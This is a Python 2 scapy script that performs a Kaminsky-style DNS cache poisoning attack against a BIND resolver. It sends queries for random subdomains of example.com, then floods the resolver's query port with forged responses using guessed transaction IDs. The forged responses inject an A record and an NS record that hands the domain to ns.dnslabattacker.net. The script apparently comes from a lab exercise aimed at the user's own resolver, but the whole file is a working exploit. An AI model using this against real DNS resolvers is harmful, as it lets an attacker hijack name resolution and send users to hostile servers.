#!/usr/bin/env python2
import argparse
import socket
from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits

parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

my_ip = args.ip # your bind's ip address
my_port = args.port # your bind's port (DNS queries are send to this port)
my_query_port = args.query_port # port that your bind uses to send its DNS queries
subdomain_name = "example.com"

def getRandomSubDomain():
    return ''.join(choice(ascii_lowercase + digits) for _ in range(10))

def getRandomTXID():
    return randint(0, 65535)

def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

if __name__ == '__main__':
    try:
        while True:
            subdomain_name = getRandomSubDomain() + '.example.com' #random subdomain name
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            dnsPacket = DNS(rd=1, qd=DNSQR(qname=subdomain_name))
            sendPacket(sock, dnsPacket, my_ip, my_port)

            #spoof
            dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            return_data = DNS(id=getRandomTXID(), aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0,
                                qd=DNSQR(qname=subdomain_name), an=DNSRR(rrname=subdomain_name, type='A', rdata='1.2.3.4', ttl=60000),
                                ns=DNSRR(rrname=b'example.com', rdata='ns.dnslabattacker.net', type='NS', ttl=60000)
                            )
            for i in range(50):
                return_data.getlayer(DNS).id = getRandomTXID()
                sendPacket(dns_sock, return_data, my_ip, my_query_port)
            dns_sock.close()

            # print('id:', return_data.id)
            # print('an:', return_data.an)
            # print('qd:', return_data.qd)
            # print('ns:', return_data.ns)
            # print('aa:', return_data.aa)

            response, (addr, port) = sock.recvfrom(4096)
            response = DNS(response)
            if response[DNS].an:
                print(response[DNS].an.rdata)
            
            # print(response[DNS].ns[DNSRR][0].rdata)
            if response[DNS].an and response[DNS].an.rdata == '1.2.3.4':
                print(response[DNS].ns[DNSRR][0].rdata)
                sock.close()
                print("success")
                break
    except KeyboardInterrupt:
        print("\nTerminating script.")
    except Exception as e:
        print("An error occurred:", e)

